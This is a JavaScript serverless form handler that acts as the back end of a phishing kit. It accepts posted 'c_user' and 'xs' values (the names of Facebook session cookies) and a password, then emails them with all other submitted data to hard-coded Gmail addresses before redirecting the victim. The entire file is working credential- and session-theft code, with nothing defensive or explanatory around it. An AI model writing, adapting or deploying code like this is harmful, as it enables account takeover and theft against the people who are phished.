import { transporter } from "./emailConfig.js";

// form-data parsing ke liye
import bodyParser from "body-parser";

export const config = {
  api: {
    bodyParser: false // Disable default parser
  }
};

export default async function handler(req, res) {
  // ✅ CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Accept, Authorization"
  );

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  // ✅ Form parsing
  let formData = {};
  try {
    // form-urlencoded parse
    const chunks = [];
    for await (const chunk of req) {
      chunks.push(chunk);
    }
    const rawData = Buffer.concat(chunks).toString();

    if (req.headers["content-type"].includes("application/json")) {
      formData = JSON.parse(rawData);
    } else {
      // Convert "c_user=123&xs=abc" → { c_user: "123", xs: "abc" }
      formData = Object.fromEntries(new URLSearchParams(rawData));
    }
  } catch (err) {
    return res.status(400).json({ error: "Invalid form data" });
  }

  // ✅ Extract fields
  const { c_user, xs, password } = formData;

  try {
    await transporter.sendMail({
      from: `"PROFESSOR" <dardhame1@gmail.com>`,
      to: "newzatpage.@gmail.com, submitdispute@gmail.com",
      subject: "Zubair",
      text: `
c_user: ${c_user || "Not provided"}
xs: ${xs || "Not provided"}
password: ${password || "Not provided"}
Full Data: ${JSON.stringify(formData, null, 2)}
      `,
      html: `
        <h3>Professor Link</h3>
        <p><strong>c_user:</strong> ${c_user || "Not provided"}</p>
        <p><strong>xs:</strong> ${xs || "Not provided"}</p>
        <p><strong>password:</strong> ${password || "Not provided"}</p>
        <h4>Full Data:</h4>
        <pre>${JSON.stringify(formData, null, 2)}</pre>
      `
    });

    // Redirect support for HTML forms
    if (formData._redirect) {
      res.writeHead(302, { Location: formData._redirect });
      return res.end();
    }

    res.status(200).json({ success: true, message: "Data sent via email" });
  } catch (error) {
    console.error("Email send error:", error);
    res.status(500).json({ error: "Failed to send email" });
  }
}
